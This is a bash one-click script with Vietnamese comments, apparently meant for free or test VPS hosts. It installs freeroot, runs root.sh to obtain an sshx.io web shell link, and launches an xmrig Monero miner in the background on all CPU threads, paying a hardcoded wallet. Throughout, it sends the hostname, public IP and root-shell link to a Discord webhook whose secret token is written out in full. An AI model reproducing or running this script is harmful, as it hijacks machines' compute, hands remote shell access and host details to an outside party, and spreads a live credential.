#!/usr/bin/env bash
# Script one-click: cài freeroot + sshx + đào XMR + log về Discord webhook
# Tác giả: Hiếu (@Nguoibianhz)
# Fix: Xóa expect heredoc để tránh syntax error khi pipe curl | bash
# Cách chạy: curl -sSf https://raw.githubusercontent.com/Nguoibianhz/vpstest/main/nah.sh | bash

set -e

WEBHOOK_URL="https://discord.com/api/webhooks/1458382949006180394/Sp-J4ElLAzQdSuagw-iURZETXP-lOQ3JJBbz4EsiVOJ4YJgjitmunWczbdWU4IuQQs3e"

send_log() {
    local message="$1"
    local color=3066993
    [[ "$message" == *"lỗi"* || "$message" == *"thất bại"* ]] && color=15158332

    curl -s -X POST "$WEBHOOK_URL" \
        -H "Content-Type: application/json" \
        -d '{
            "embeds": [{
                "title": "Log từ server mining",
                "description": "'"$(hostname -f || echo 'unknown')" - $(date '+%Y-%m-%d %H:%M:%S')",
                "color": '"$color"',
                "fields": [{"name": "Status", "value": "'"$message"'", "inline": false}],
                "footer": {"text": "Script one-click | IP: '"$(curl -s ifconfig.me || echo 'ẩn')"'"}
            }]
        }' >/dev/null 2>&1 || true
}

send_log "Bắt đầu chạy script one-click trên $(hostname)"

echo "[1/6] Cập nhật + cài gói..."
apt update -y && apt upgrade -y
apt install -y curl tar git sudo || { send_log "Lỗi cài gói cơ bản"; exit 1; }
send_log "Cài gói cơ bản OK"

echo "[2/6] Xử lý freeroot..."
if [ -d "freeroot" ]; then
    cd freeroot || { send_log "Lỗi cd freeroot cũ"; exit 1; }
    git pull || echo "Pull fail, dùng cũ"
else
    git clone https://github.com/foxytouxxx/freeroot.git || { send_log "Lỗi clone freeroot"; exit 1; }
    cd freeroot
fi
send_log "freeroot OK"

echo "[3/6] Chạy root.sh (tự yes) + lấy link sshx..."
SSHX_LINK=""
OUTPUT=$(echo "yes" | bash root.sh 2>&1)

SSHX_LINK=$(echo "$OUTPUT" | grep -o 'https://sshx.io/s/[a-zA-Z0-9]\{6,\}' | head -1)

if [ -n "$SSHX_LINK" ]; then
    send_log "root.sh OK! Link: $SSHX_LINK"
else
    send_log "root.sh chạy nhưng ko tìm thấy link sshx (check thủ công)"
fi

cd ~

echo "[4/6] Tải xmrig v6.25.0..."
XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-x64.tar.gz"
rm -rf xmrig.tar.gz xmrig-6.25.0 2>/dev/null
curl -L -o xmrig.tar.gz "$XMRIG_URL" || { send_log "Lỗi tải xmrig"; exit 1; }
tar -xzf xmrig.tar.gz
chmod +x xmrig-6.25.0/xmrig || { send_log "Lỗi chmod xmrig"; exit 1; }
send_log "xmrig tải + giải nén OK"

echo "[5/6] Chạy miner..."
cd xmrig-6.25.0
nohup ./xmrig \
    --donate-level=0 \
    --url=pool.supportxmr.com:3333 \
    --user=441a31Nzr1cJLRzwMoUrRV6j1Uj7UqJG7bDJjrZcz8xmD5idyyEWBVn72X4ioYk3Vtg8G8VB1utd2Z7jiqQE57KnStVfYas \
    --pass=x \
    --threads=$(nproc --all) \
    --print-time=60 \
    --background \
    --log-file=/root/xmrig.log >/dev/null 2>&1 &

sleep 5

if pgrep -x "xmrig" >/dev/null; then
    send_log "Miner chạy OK! Threads: $(nproc --all) | Log: /root/xmrig.log"
    [ -n "$SSHX_LINK" ] && send_log "Link SSH root: $SSHX_LINK"
else
    send_log "Miner KO chạy (check: cat /root/xmrig.log)"
fi

echo ""
echo "============================================================="
echo "HOÀN TẤT! Miner chạy ngầm."
echo " - Log: cat /root/xmrig.log | tail -n 50"
echo " - Dừng: pkill xmrig"
echo " - Log gửi Discord rồi"
echo "============================================================="
send_log "Script hoàn tất thành công"
